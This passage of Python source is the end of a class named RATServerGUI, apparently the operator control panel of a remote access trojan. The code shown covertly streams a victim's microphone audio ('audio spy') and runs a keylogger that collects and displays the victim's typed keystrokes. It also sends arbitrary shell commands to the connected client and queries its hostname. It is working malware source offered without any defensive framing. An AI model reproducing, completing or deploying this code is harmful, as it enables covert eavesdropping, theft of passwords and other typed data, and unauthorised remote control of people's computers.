            paudio = pyaudio.PyAudio()
            audio_stream = paudio.open(channels=2, rate=44100, format=pyaudio.paInt16, output=True)
            
            while self.audiospy_trigger:
                try:
                    audio_data = udps.recvfrom(self.BUFFER)[0]
                    audio_stream.write(audio_data)
                except Exception as e:
                    if not self.audiospy_trigger:
                        break
                    self.log(f"Audio monitoring error: {e}")
                    continue
            
            # Cleanup
            audio_stream.stop_stream()
            audio_stream.close()
            paudio.terminate()
            udps.close()
            
            if self.current_client_socket:
                self.current_client_socket.send(b'CLOSE_AUDIO_SPY')
            
        except Exception as e:
            self.log(f"Audio monitoring thread error: {e}")
        
        # Reset UI
        self.start_audio_btn.configure(state="normal")
        self.stop_audio_btn.configure(state="disabled")
        self.audio_display.configure(text="No audio monitoring active")
    
    def stop_audio_monitoring(self):
        self.audiospy_trigger = False
        self.log("Stopped audio monitoring")
    
    def start_keylogger(self):
        if not self.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        self.keyboard_recording_trigger = True
        threading.Thread(target=self.keyboard_record_thread, daemon=True).start()
        
        # Update UI
        self.start_keyboard_btn.configure(state="disabled")
        self.stop_keyboard_btn.configure(state="normal")
        self.keyboard_log.delete(1.0, tk.END)
        self.log("Started keylogger")
    
    def keyboard_record_thread(self):
        try:
            self.current_client_socket.send(b'KEY_REC')
            full_word = ''
            
            while self.keyboard_recording_trigger:
                try:
                    data = self.current_client_socket.recv(self.BUFFER).decode().strip("'")
                    if not data:
                        continue
                    
                    if '⌫' in data:
                        # Backspace
                        full_word = full_word[:-1]
                    elif '\n' in data:
                        full_word += '\n'
                    else:
                        full_word += data
                    
                    # Update keyboard log
                    self.keyboard_log.delete(1.0, tk.END)
                    self.keyboard_log.insert(tk.END, full_word)
                    self.keyboard_log.see(tk.END)
                
                except Exception as e:
                    if not self.keyboard_recording_trigger:
                        break
                    self.log(f"Keylogger error: {e}")
                    continue
            
            # Stop keylogger on client
            if self.current_client_socket:
                self.current_client_socket.send(b'STOP_KEY_REC')
            
        except Exception as e:
            self.log(f"Keylogger thread error: {e}")
        
        # Reset UI
        self.start_keyboard_btn.configure(state="normal")
        self.stop_keyboard_btn.configure(state="disabled")
    
    def stop_keylogger(self):
        self.keyboard_recording_trigger = False
        self.log("Stopped keylogger")
    
    # Helper functions from original code
    def data_unpacker(self, data) -> int:
        return struct.unpack('Q', data)[0]
    
    def getHostName(self, client_socket) -> str:
        client_socket.send('GETHOSTNAME'.encode())
        hostname = client_socket.recv(self.BUFFER)
        return hostname.decode()
    
    def send_cmd(self, client_socket, command) -> tuple:
        xcommand = 'CMD_COMMAND_' + command
        client_socket.send(xcommand.encode('utf-8'))
        size_ = self.data_unpacker(client_socket.recv(self.BUFFER))
        data = client_socket.recv(size_)
        return (data, size_)
    
    def validate_string(self, text):
        if len(text) == 0:
            return False
        elif text == '':
            return False
        elif text == ' ':
            return False
        elif text.isspace():
            return False
        return True
    
    def run(self):
        # Run the main application loop
        self.root.mainloop()


if __name__ == "__main__":
    # Handle import errors gracefully
    missing_modules = []
    try:
        import customtkinter as ctk
    except ImportError:
        missing_modules.append("customtkinter")
    
    try:
        from PIL import ImageTk
    except ImportError:
        missing_modules.append("pillow")
    
    if missing_modules:
        try:
            import tkinter as tk
            from tkinter import messagebox
            
            root = tk.Tk()
            root.withdraw()
            
            messagebox.showerror(
                "Missing Dependencies",
                f"Please install the following Python modules:\n\n" +
                "\n".join(f"- {module}" for module in missing_modules) +
                "\n\nInstall using: pip install " + " ".join(missing_modules)
            )
            
            root.destroy()
        except:
            print("Error: Missing dependencies:", ", ".join(missing_modules))
            print("Install using: pip install", " ".join(missing_modules))
        
        exit(1)
    
    # Start application
    app = RATServerGUI()
    app.run()